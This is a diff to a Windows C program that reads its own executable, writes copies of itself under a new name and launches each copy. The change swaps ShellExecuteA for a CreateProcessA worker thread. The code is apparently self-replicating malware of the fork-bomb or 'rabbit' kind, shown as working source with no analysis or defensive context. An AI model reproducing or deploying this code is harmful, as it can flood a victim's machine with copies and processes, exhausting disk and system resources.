@@ -13,14 +13,39 @@ int myEXESize = 0;
 UINT8* myFileBuffer = 0;
 
 char nextEXEName[256] = { 0 };
-char **global_argv = 0;
 
-void PopCtl(void);
+void create_proc_worker()
+{
+    // work around for something like NtRaiseHardError in stupid kernel32.dll
+    // consider NtCreateUserProcess in the future
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOWNORMAL;
+    BOOL ok = CreateProcessA(
+        nextEXEName,   // lpApplicationName
+        NULL,          // lpCommandLine
+        NULL,          // lpProcessAttributes
+        NULL,          // lpThreadAttributes
+        FALSE,         // bInheritHandles
+        CREATE_NEW_CONSOLE, // dwCreationFlags
+        NULL,          // lpEnvironment
+        NULL,          // lpCurrentDirectory
+        &si,
+        &pi
+    );
+    if (!ok) {
+        DWORD err = GetLastError();
+        printf("Oh no! %s launch failed: %d\n", nextEXEName, err);
+    } else {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
 
 int main(int argc, char** argv)
 {
-    global_argv = argv;
-    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
     FILE* fp = fopen(argv[0], "rb");
     fseek(fp, 0, SEEK_END);
     myEXESize = ftell(fp);
@@ -42,6 +67,9 @@ int main(int argc, char** argv)
         fwrite(myFileBuffer, 1, myEXESize, fp);
         Sleep(GapTime); // Delay is important here to avoid producing so fast
         fclose(fp); fp = NULL; // unlock the file
-        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
+
+        //ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
+        HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)create_proc_worker, 0, 0, 0);
+        WaitForSingleObject(hThread, GapTime);
     }
 }
